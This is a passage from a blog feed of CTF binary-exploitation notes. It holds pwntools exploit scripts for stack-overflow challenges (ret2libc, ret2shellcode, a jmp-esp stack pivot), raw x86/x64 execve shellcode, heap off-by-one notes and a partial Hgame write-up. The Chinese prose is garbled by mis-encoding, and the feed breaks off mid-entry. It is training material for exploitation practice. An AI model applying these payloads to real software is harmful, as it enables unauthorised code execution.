    <link href="/2020/01/28/pwn_by_examples/"/>
    <url>/2020/01/28/pwn_by_examples/</url>
    
    <content type="html"><![CDATA[<p>x64å‚æ•°æŒ‰åœ¨rdi,rsi,rdx,rcs,r8,r9ä¾æ¬¡å‚¨å­˜</p><h2 id="IDAéƒ¨åˆ†"><a href="#IDAéƒ¨åˆ†" class="headerlink" title="IDAéƒ¨åˆ†"></a>IDAéƒ¨åˆ†</h2><p>shift f12 å­—ç¬¦ä¸²</p><p>n é‡å‘½å</p><p>x æŸ¥çœ‹å¼•ç”¨</p><h2 id="bashéƒ¨åˆ†"><a href="#bashéƒ¨åˆ†" class="headerlink" title="bashéƒ¨åˆ†"></a>bashéƒ¨åˆ†</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cyclic 200 <span class="hljs-comment">#ç”Ÿæˆå¾ªç¯ 200ä¸ª</span><br>cyclic -l xxxxx <span class="hljs-comment">#è®¡ç®—åç§»</span><br></code></pre></td></tr></table></figure><h2 id="PWNTOOLSéƒ¨åˆ†"><a href="#PWNTOOLSéƒ¨åˆ†" class="headerlink" title="PWNTOOLSéƒ¨åˆ†"></a>PWNTOOLSéƒ¨åˆ†</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">u64 <br><span class="hljs-keyword">asm</span> <br>disasm <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>rop = ROP(elf)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * offset<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>])<br>payload += p32(rop.search(<span class="hljs-number">8</span>).address)<br>payload += p32(elf.bss() + <span class="hljs-number">0x100</span>)<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(elf.bss() + <span class="hljs-number">0x100</span>)<br>sh.sendline(payload)<br><br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>å…ˆæ‰§è¡Œäº†pop_ret ç„¶åæ‰§è¡Œgetsï¼Œå¹¶æ”¾åˆ°äº†bss()+ 0x100çš„åœ°æ–¹ã€‚éšåsystem(elf.bss()+ 0x100)</p><h2 id="pwndbgéƒ¨åˆ†"><a href="#pwndbgéƒ¨åˆ†" class="headerlink" title="pwndbgéƒ¨åˆ†"></a>pwndbgéƒ¨åˆ†</h2><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>jmp esp</p><p>å‡½æ•°è¿”å›çš„æ—¶å€™espä¼šåˆšå¥½æŒ‡å‘è¿”å›åœ°å€çš„ä¸‹ä¸€ä¸ªåœ°å€</p><img src="/2020/01/28/pwn_by_examples/image-20200125172524547.png" class="" title="image-20200125172524547"><hr><blockquote><p>ä½œè€…ï¼šçœ‹é›ªå­¦é™¢<br>é“¾æ¥ï¼š<a href="https://www.jianshu.com/p/1bdac9837eff">https://www.jianshu.com/p/1bdac9837eff</a><br>æ¥æºï¼šç®€ä¹¦</p></blockquote><h2 id="ç¬¬ä¸€é¢˜ï¼ˆå †æ ˆç›´æ¥æ‰§è¡Œshellcodeï¼‰"><a href="#ç¬¬ä¸€é¢˜ï¼ˆå †æ ˆç›´æ¥æ‰§è¡Œshellcodeï¼‰" class="headerlink" title="ç¬¬ä¸€é¢˜ï¼ˆå †æ ˆç›´æ¥æ‰§è¡Œshellcodeï¼‰"></a>ç¬¬ä¸€é¢˜ï¼ˆå †æ ˆç›´æ¥æ‰§è¡Œshellcodeï¼‰</h2><p>æ¥ä¸‹æ¥è¿™é¢˜ï¼Œæˆ‘ä»¬å†è½»æ¾ä¸€ç‚¹ï¼Œå¯ä»¥ç›´æ¥åœ¨å †æ ˆä¸­æ‰§è¡Œç¨‹åºã€‚</p><p>pwn5ï¼ˆå‚è€ƒâ€œé˜…è¯»åŸæ–‡â€ï¼‰</p><p>ç»§ç»­å‰é¢çš„å¥—è·¯ã€‚</p><p><strong>ç¬¬ä¸€æ­¥ï¼ŒæŸ¥çœ‹ä¿æŠ¤</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7CimageView2/2/w/644/format/webp" alt="img"></p><p>å‘ç°ï¼Œå¯ä»¥ç›´æ¥åœ¨å †æ ˆä¸Šæ‰§è¡Œç¨‹åºäº†ï¼Œå¼€å¯çš„æ˜¯PIEï¼Œåœ°å€éšæœºåŒ–çš„ä¿æŠ¤ã€‚</p><p><strong>ç¬¬äºŒæ­¥ï¼Œåˆ¤æ–­æ¼æ´å‡½æ•°ã€‚</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp" alt="img"></p><p>å‘ç°å‡½æ•°æ˜¯readï¼Œä»…ä»…è¯»å–0x40ï¼ˆ64ï¼‰ä¸ªå­—èŠ‚ã€‚</p><p><strong>ç¬¬ä¸‰æ­¥ï¼Œè®¡ç®—ç›®æ ‡å˜é‡çš„åœ¨å †æ ˆä¸­è·ç¦»ebpçš„åç§»</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7CimageView2/2/w/388/format/webp" alt="img"></p><p>EBPçš„å†…å®¹ä¸ºï¼š0x3761413661413561</p><blockquote><p>$ python patternLocOffset.py -l 700 -s 0x3761413661413561</p><p>[*] Create pattern string contains 700 characters ok!</p><p>[*] No exact matches, looking for likely candidatesâ€¦</p><p>[+] Possible match at offset 16 (adjusted another-endian)</p><p>[+] take time: 0.0005 s</p></blockquote><p>è·ç¦»EBPçš„åç§»æ˜¯16ä¸ªå­—èŠ‚ï¼Œè·ç¦»å­˜æ”¾çš„è¿”å›åœ°å€æ˜¯16+8=24ä¸ªå­—èŠ‚ã€‚</p><p>è¿™é‡Œå¯ä»¥å‘ç°IDAåˆ†æçš„åˆæ˜¯æ­£ç¡®çš„äº†ï¼Œ0x10ä¸ªå­—èŠ‚ã€‚</p><p><strong>ç¬¬å››æ­¥å’Œç¬¬äº”æ­¥ï¼Œåˆ†ææ˜¯å¦å·²ç»è½½å…¥äº†å¯ä»¥åˆ©ç”¨çš„å‡½æ•°</strong></p><p>å¦‚systemï¼Œexecveç­‰</p><p>å‘ç°ï¼Œå¹¶æ²¡æœ‰ä¸Šè¿°å‡½æ•°ã€‚ä½†æ˜¯ç”±äºå †æ ˆå¯ä»¥æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç›´æ¥å°†shellcodeé˜»æ­¢åœ¨payloadé‡Œé¢ã€‚å› æ­¤ï¼Œè¿™é‡Œå’Œç¬¬äº”æ­¥åˆ†ææ˜¯å¦æœ‰å­—ç¬¦ä¸²/bin/shåˆå¹¶äº†ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±æ”¾ç½®å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è°ƒç”¨å¯¹åº”çš„åœ°å€äº†ã€‚</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" alt="img"></p><p>ç†è®ºä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨pwntoolsäº§ç”Ÿçš„shellcodeæ¥è¿›è¡Œéƒ¨ç½²ï¼Œä½†æ˜¯è¿™é“é¢˜æœ‰ç‚¹ç‰¹æ®Šã€‚åœ¨è¿”å›åœ°å€ä¹‹åæ‰€å‰©ä½™çš„ç©ºé—´=64-24-8=32ä¸ªå­—èŠ‚ï¼ˆè¿”å›åœ°å€è¿˜è¦å ç”¨8ä¸ªå­—èŠ‚ï¼‰ï¼Œå› æ­¤å®é™…éƒ¨ç½²shellcodeçš„é•¿åº¦è¿˜å‰©ä¸‹32ä¸ªå­—èŠ‚ï¼Œä½¿ç”¨pwntoolsäº§ç”Ÿçš„shellcodeæœ‰44ä¸ªå­—èŠ‚ï¼Œå¤ªé•¿äº†ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä»ç½‘ä¸Šæ‰¾åˆ°æ›´çŸ­çš„shellcodeï¼š</p><blockquote><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = â€œ\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05â€</p></blockquote><p>å®ƒçš„æ±‡ç¼–å½¢å¼æ˜¯ï¼š</p><blockquote><p># char *const argv[]</p><p>xorl %esi, %esi</p><p>#</p><p> â€˜hâ€™ â€˜sâ€™ â€˜/â€˜ â€˜/â€˜ â€˜nâ€™ â€˜iâ€™ â€˜bâ€™ â€˜/â€˜</p><p>movq $0x68732f2f6e69622f, %rbx</p><p>#</p><p> for â€˜\x00â€™</p><p>pushq %rsi</p><p>pushq %rbx</p><p>pushq %rsp</p><p>#</p><p> const char *filename</p><p>popq %rdi</p><p>#</p><p> __NR_execve 59</p><p>pushq $59</p><p>popq %rax</p><p>#</p><p> char *const envp[]</p><p>xorl %edx, %edx</p><p>syscall</p></blockquote><p>å¥½äº†ï¼Œshellcodeç¡®å®šå¥½äº†ï¼Œæˆ‘ä»¬ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ã€‚Shellcodeæ‰§è¡Œçš„åœ°å€å¦‚ä½•ç¡®å®šå‘¢ï¼Ÿshellcodeçš„åœ°å€ï¼Œå…¶å®å°±æ˜¯bufçš„åœ°å€åŠ ä¸Š32ä¸ªå­—èŠ‚çš„åç§»ã€‚</p><p>æˆ‘ä»¬å‰é¢å‘ç°ï¼Œè¯¥ç¨‹åºæ˜¯åŠ¨æ€æ”¹å˜åœ°å€çš„ï¼Œå› æ­¤é™æ€çš„ç¡®è®¤bufåœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼Œè¿›è€Œé™æ€çš„ç¡®è®¤shellcodeçš„åœ°å€æ˜¯ä¸å¯è¡Œçš„ã€‚</p><p>å¤„ç†åˆ°è¿™é‡Œå¥½åƒæœ‰ç‚¹æ­»èƒ¡åŒäº†ï¼Œæˆ‘ä»¬å‘ç°ç¨‹åºä¸­æœ‰printfå‡½æ•°ï¼Œç†è®ºä¸Šå¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰“å°bufçš„åœ°å€ï¼Œç„¶åå®æ—¶çš„è®¡ç®—buf+32çš„åœ°å€ï¼Œå°±èƒ½å¤Ÿå¾—åˆ°shellcodeçš„åœ°å€ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å›å¤´çœ‹çœ‹ç¨‹åºæœ¬èº«çš„æ‰§è¡Œï¼Œä¼šå‘ç°ï¼š</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7CimageView2/2/w/729/format/webp" alt="img"></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7CimageView2/2/w/506/format/webp" alt="img"></p><p>å®ƒå®é™…ä¸Šå·²ç»ä¸ºæˆ‘ä»¬è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œè‡ªå·±è¾“å‡ºäº†bufçš„åœ°å€ï¼ˆ= = CTFé¢˜ç›®çš„éš¾æ˜“ç¨‹åº¦çœŸçš„æ˜¯å¾®å¦™ä¹‹é—´å‘€ï¼‰ã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬çš„expæ€è·¯å°±æ˜¯ï¼š å®æ—¶è¯»å–bufçš„åœ°å€ï¼Œè®¡ç®—buf+32å¾—åˆ°shellcodeçš„åœ°å€ï¼Œæ”¾ç½®åœ¨payloadä¸­ã€‚</p><blockquote><p>from pwn import *</p><p>code = ELF(â€˜./pwn5â€™)</p><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = â€œ\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05â€</p><p>sh.recvuntil(â€˜[â€˜)</p><p>buf_addr = sh.recvuntil(â€˜]â€™, drop=True)</p><p>buf_addr = int(buf_addr, 16)</p><p>payload = â€˜bâ€™ * 24 + p64(buf_addr + 32) + shellcode_x64</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>å †æ ˆçš„å¸ƒç½®å›¾ï¼Œä»¥åŠåœ°å€çš„ç›¸å¯¹ä½ç½®ï¼Œä»¥bufä¸ºèµ·ç‚¹ã€‚</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7CimageView2/2/w/699/format/webp" alt="img"></p><p>ç¬¬äºŒé¢˜ï¼ˆæ§åˆ¶espè¿›è¡Œç²¾å‡†æ‰“å‡»ï¼‰</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥ç‚¹æœ‰éš¾åº¦çš„ã€‚åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼Œæˆ‘ä»¬çš„payloadå®åœ¨æ”¾ä¸ä¸‹äº†ï¼Œå³ä½¿æ˜¯23å­—èŠ‚ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>pwn6ï¼ˆå‚è€ƒâ€œé˜…è¯»åŸæ–‡â€ï¼‰</p><p>ç»§ç»­å‰é¢çš„è¿‡ç¨‹ï¼š</p><p><strong>ç¬¬ä¸€æ­¥ï¼šæ£€æµ‹ä¿æŠ¤æƒ…å†µ</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7CimageView2/2/w/520/format/webp" alt="img"></p><p>å‘ç°ï¼Œæ˜¯ä¸ªä¸‰æ— ç¨‹åºã€‚ä¹ˆæœ‰ä»»ä½•ä¿æŠ¤ï¼Œçœ‹èµ·æ¥å¾ˆç®€å•ï¼Ÿå“ˆå“ˆï¼Œå¹¶æ²¡æœ‰ã€‚çœ‹å®˜è¯·ç»§ç»­ã€‚</p><p><strong>ç¬¬äºŒæ­¥ï¼Œåˆ¤æ–­æ¼æ´å‡½æ•°</strong></p><p>å¦‚gets,scanfç­‰ï¼š</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/313/format/webp" alt="img"></p><p>å‘ç°æ˜¯fgetså‡½æ•°ï¼Œä»…ä»…è¯»å–50ä¸ªå­—èŠ‚çš„å­—ç¬¦é•¿åº¦ã€‚</p><p><strong>ç¬¬ä¸‰æ­¥</strong></p><p>è®¡ç®—ç›®æ ‡å˜é‡çš„åœ¨å †æ ˆä¸­è·ç¦»ebpçš„åç§»ã€‚</p><p>æ–¹æ³•å’Œå‰é¢ç±»ä¼¼ï¼Œå‘ç°åç§»è·ç¦»ebpæ˜¯0x20ï¼Œé‚£ä¹ˆè·ç¦»ret_addrå°±æ˜¯0x20+4=0x24ï¼ˆ36ï¼‰å­—èŠ‚äº†ã€‚</p><p><strong>ç¬¬å››æ­¥å’Œç¬¬äº”æ­¥</strong></p><p>åˆ†ææ˜¯å¦å·²ç»è½½å…¥äº†å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ã€‚å‘ç°å¹¶æ²¡æœ‰ï¼š</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7CimageView2/2/w/461/format/webp" alt="img"></p><blockquote><p>$ ROPgadget â€“binary stack_pivoting_1 â€“string â€˜/bin/shâ€™</p><p>Strings information</p><p>============================================================</p></blockquote><p>å­—ç¬¦ä¸²è‡ªç„¶ä¹Ÿæ˜¯æ²¡æœ‰çš„ã€‚</p><p>æˆ‘ä»¬è€ƒè™‘åˆ©ç”¨shellcodeï¼Œå¥½åƒå¯ä»¥ç±»ä¼¼äºä¸Šä¸€é¢˜çš„æ“ä½œäº†ã€‚ä½†æ˜¯å¹¶ä¸èƒ½ï¼Œç•™ç»™æˆ‘ä»¬å¸ƒç½®shellcodeçš„é•¿åº¦ä¸º50-36-4=10å­—èŠ‚ï¼ˆåŒæ ·æœ‰4ä¸ªå­—èŠ‚çš„è¿”å›åœ°å€å­˜æ”¾ï¼‰ï¼å°´å°¬ä¸==ï¼Œæ”¾ä¸¤ä¸ªåœ°å€å°±æ²¡æœ‰ä½ç½®äº†ã€‚ä½†å¦‚æœä½ èƒ½å¤Ÿå‰å®³åˆ°ç”¨10ä¸ªå­—èŠ‚åšshellcodeï¼Œè¯·å¤§èƒ†åˆ†äº«å‡ºæ¥ï¼</p><p>é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>æ—¢ç„¶ï¼Œå †æ ˆæº¢å‡ºçš„ä½ç½®ä¸è¡Œäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŠŠshellcodeæ”¾åœ¨æ ˆé‡Œé¢å§ï¼å› ä¸ºå †æ ˆå…·æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œå› æ­¤è¿™æ ·å®Œå…¨æ˜¯å¯è¡Œçš„ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘å…ˆæ”¾å›¾å‡ºæ¥è§£é‡Šä¸€ä¸‹æ€è·¯ï¼š</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp" alt="img"></p><p>æˆ‘ä»¬è¿™æ ·å°±æ€»å…±æœ‰0x20ï¼ˆ36ä¸ªå­—èŠ‚ï¼‰çš„ä½ç½®å­˜æ”¾shellcodeçš„äº†ï¼Œé¡¿æ—¶æ„Ÿè§‰æ‰¾åˆ°äº†æ–°å‡ºè·¯ã€‚ä½†æ˜¯ï¼Œè¦åšåˆ°è·³è½¬åˆ°æ”¾ç½®shellcodeçš„ä½ç½®ï¼Œä¼¼ä¹å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚è¦è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦åšåˆ°ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š</p><p>æ¨ç®—shellcodeæ”¾ç½®çš„åœ°å€</p><p>è·³è½¬åˆ°shellcodeæ”¾ç½®çš„ä½ç½®</p><p>é¦–å…ˆï¼Œç¬¬ä¸€ç‚¹ï¼Œshellcodeçš„ä½ç½®å°±æ˜¯å‘å°„payloadçš„æ—¶å€™esp_oldçš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥æ¨ç®—å‡ºæ¥ï¼Œå½“ç¨‹åºæå–å®Œè¿”å›åœ°å€ä¹‹åï¼ŒespæŒ‡å‘çš„åœ°å€è·ç¦»esp_oldçš„åœ°å€ä¸º0x20+4(ebp)+4(ret_addr)=0x28ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç”¨å½“å‰çš„esp-0x28ï¼Œå¾—åˆ°çš„å°±æ˜¯shellcodeçš„åœ°å€ã€‚</p><p>å¯¹äºç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬å¦‚ä½•è®©eipé¡ºåˆ©çš„ä¾æ¬¡å–å‡ºæˆ‘ä»¬è®¾è®¡å¥½çš„è·¯çº¿å›¾å‘¢ï¼Ÿåœ¨ret_addrï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾åˆ°ä¸€ä¸ªgadgetï¼Œå®ƒèƒ½å¤Ÿè·³è½¬åˆ°espçš„ä½ç½®ï¼Œä»¥ç»§ç»­å¾€åæ‰§è¡Œæ ˆä¸Šçš„ä»£ç ã€‚æ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸ç›´æ¥å°†å¯æ‰§è¡Œçš„ä»£ç å¸ƒç½®åœ¨ret_addrçš„ä½ç½®ï¼Œå› ä¸ºè¿™é‡Œæ˜¯åŸæœ¬çš„å‡½æ•°æå–è¿”å›å‡½æ•°åœ°å€çš„åœ°æ–¹ï¼Œå®ƒå¹¶ä¸ä¼šæ‰§è¡Œè¿™é‡Œä½ç½®çš„ä»£ç ï¼Œè€Œæ˜¯æ‰§è¡Œè¿™ä¸ªä½ç½®çš„å†…å®¹æŒ‡å‘çš„åœ°å€çš„ä»£ç ã€‚æˆ‘ä»¬éœ€è¦jmp espè¿™ä¸ªæ“ä½œï¼Œæ¥è®©ç¨‹åºæµè·å¾—åœ¨æ ˆä¸Šæ‰§è¡Œçš„å…ˆæ²³ã€‚</p><blockquote><p>$ ROPgadget â€“binary stack_pivoting_1 â€“only â€˜jmp|retâ€™ | grep â€˜espâ€™</p><p>0x08048504 : jmp esp</p></blockquote><p>å‘ç°åªæœ‰è¿™ä¹ˆä¸€ä¸ªåœ°å€ã€‚0x08048504ã€‚è¿™ä¹Ÿæ­£æ˜¯å›¾ä¸­çš„ä½ç½®ã€‚æ³¨æ„ï¼Œå½“æˆ‘ä»¬å–å‡ºret_addré‡Œé¢çš„åœ°å€çš„æ—¶å€™ï¼Œespå·²ç»+4äº†ï¼Œå› æ­¤å°±ä¼šæŒ‡å‘æˆ‘ä»¬çš„ä¸‹ä¸€æ­¥æ“ä½œï¼šè·³è½¬å›esp_oldçš„ä½ç½®ã€‚</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥é€‰æ‹©è®©pwntoolsäº§ç”Ÿå¯æ‰§è¡Œçš„ä»£ç â€sub  esp 0x28; jmp espâ€ã€‚æ³¨æ„ï¼Œè¿™é‡Œå¯ä»¥æ˜¯ç›´æ¥è¿è¡Œçš„ä»£ç ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºå·²ç»å¼€å§‹åœ¨æ ˆä¸Šæ‰§è¡Œäº†ï¼Œè€Œä¸å†æ˜¯å–å‡ºåœ°å€äº†ã€‚</p><p>æœ€åçš„EXPæŒ‰ç…§ä¸‹é¢è¿™æ ·å¸ƒç½®ï¼š</p><blockquote><p>from pwn import *</p><p>sh = process(â€˜./pwn6â€™)</p><p>shellcode_x86 = â€œ\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73â€</p><p>shellcode_x86 += â€œ\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0â€</p><p>shellcode_x86 += â€œ\x0b\xcd\x80â€</p><p>sub_esp_jmp = asm(â€˜sub esp, 0x28;jmp espâ€™)</p><p>jmp_esp = 0x08048504</p><p>payload = shellcode_x86 + (</p><p>0x20 - len(shellcode_x86)) * â€˜bâ€™ + â€˜bbbbâ€™ + p32(jmp_esp) + sub_esp_jmp</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>æ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬åˆå¯ç”¨äº†å¦å¤–ä¸€æ®µä»£ç ï¼š</p><p>å®ƒæ›´åŠ çŸ­ï¼Œåªæœ‰21ä¸ªå­—èŠ‚ã€‚Shellcodeè¶ŠçŸ­æ˜¯è¶Šå¥½çš„ã€‚å®ƒçš„æ±‡ç¼–å¯¹åº”å¦‚ä¸‹ï¼š</p><blockquote><p>shellcode_x86 = â€œ\x31\xc9â€          # xor   ecx, ecx</p><p>shellcode_x86 += â€œ\xf7\xe1â€       # mul   ecx</p><p>shellcode_x86 += â€œ\x51â€       # push  ecx</p><p>shellcode_x86 += â€œ\x68\x2f\x2f\x73\x68â€ # push 0x68732f2f</p><p>shellcode_x86 += â€œ\x68\x2f\x62\x69\x6eâ€ # push 0x6e69622f </p><p>shellcode_x86 += â€œ\x89\xe3â€       # mov   ebx, esp</p><p>shellcode_x86 += â€œ\xb0\x0bâ€       # moval, 0xb</p><p>shellcode_x86 += â€œ\xcd\x80â€ # int 0x80</p></blockquote><h2 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h2><p>1ã€ç¼–è¾‘åŠŸèƒ½æ˜¯å¦å­˜åœ¨æº¢å‡º</p><p>2ã€deleteåœ°æ–¹æ˜¯å¦å­˜åœ¨å¤šé‡é‡Šæ”¾æ¼æ´ï¼Œåˆ é™¤äº†èŠ‚ç‚¹ä¹‹åæœ‰æ²¡æœ‰æ¸…0</p><p>â€‹    æ£€æŸ¥äº†èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨ï¼Œå°±ä¸èƒ½double free</p><p>â€‹    heaparray[v1] = 0LL æ¸…é›¶äº†</p><p>3ã€åœ¨showå‡½æ•°ä¸­æœ‰æ²¡æœ‰æ£€æŸ¥èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨</p><p>v0[1] = malloc(size) æ²¡æœ‰å¯¹å¤§å°é™åˆ¶ä¹Ÿç®—æ¼æ´</p><p>åªæœ‰åˆ†é…å¤§å°ä¸èƒ½è¢«2*sizeof(size_t)æ—¶æ‰ä¼šæŠŠä¸‹ä¸€å—chunkçš„prev_sizeå½“ä½œè‡ªå·±çš„å†…å®¹åŒºåŸŸ</p><h3 id="off-by-one-æ¼æ´"><a href="#off-by-one-æ¼æ´" class="headerlink" title="off by one æ¼æ´"></a>off by one æ¼æ´</h3><p><strong>è¦ä½¿ç”¨off by oneï¼Œmallocå¤§å°ä¸èƒ½æ˜¯16çš„å€æ•°ï¼ˆ64ä½æƒ…å†µä¸‹ï¼‰</strong></p><p>read_input(*(headparray[v1] + 1), *heaparray[v1] + 1LL);</p><p>èƒ½å¤Ÿä¿®æ”¹ä¸‹ä¸€å—chunkçš„sizeå­—æ®µï¼Œè¿™ç§æƒ…å†µä¸€èˆ¬è¢«ç§°ä¸ºå †æ‰©å±•æŠ€æœ¯</p><img src="/2020/01/28/pwn_by_examples/image-20200126175331744.png" class="" title="image-20200126175331744"><img src="/2020/01/28/pwn_by_examples/image-20200126175341238.png" class="" title="image-20200126175341238"><img src="/2020/01/28/pwn_by_examples/image-20200126181904887.png" class="" title="image-20200126181904887">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>å¤‡å¿˜</category>
      
      <category>æ•™ç¨‹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hgame</title>
    <link href="/2020/01/28/Hgame/"/>
    <url>/2020/01/28/Hgame/</url>
    
    <content type="html"><![CDATA[<h2 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h2><img src="/2020/01/28/Hgame/image-20200116233004577.png" class="" title="image-20200116233004577"><img src="/2020/01/28/Hgame/image-20200116233016869.png" class="" title="image-20200116233016869"><p>V5åœ¨-0x31ï¼Œsåœ¨-0xAC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sh.recvuntil(<span class="hljs-string">&quot;Let&#x27;s 0O0o\\0O0!&quot;</span>)<br>payload=<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">0xAC</span> - <span class="hljs-number">0x31</span>)<br>payload += <span class="hljs-string">&#x27;0O0o\x00O0&#x27;</span><br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h2><img src="/2020/01/28/Hgame/image-20200117005607628.png" class="" title="image-20200117005607628"><img src="/2020/01/28/Hgame/image-20200117005622807.png" class="" title="image-20200117005622807"><p>0xE0 - 0xC0ä¹‹ååˆšå¥½æ˜¯32ä½ï¼Œè¿™æ ·ç¬¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = cyclic(<span class="hljs-number">0xE0</span> - <span class="hljs-number">0xC0</span>)<br>sh.send(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;shot!\n&quot;</span>)<br>payload = <span class="hljs-built_in">str</span>(<span class="hljs-number">6295776</span>)<br>sh.send(payload)<br></code></pre></td></tr></table></figure><h2 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h2><h2 id="open-read-puts"><a href="#open-read-puts" class="headerlink" title="open_read_puts"></a>open_read_puts</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 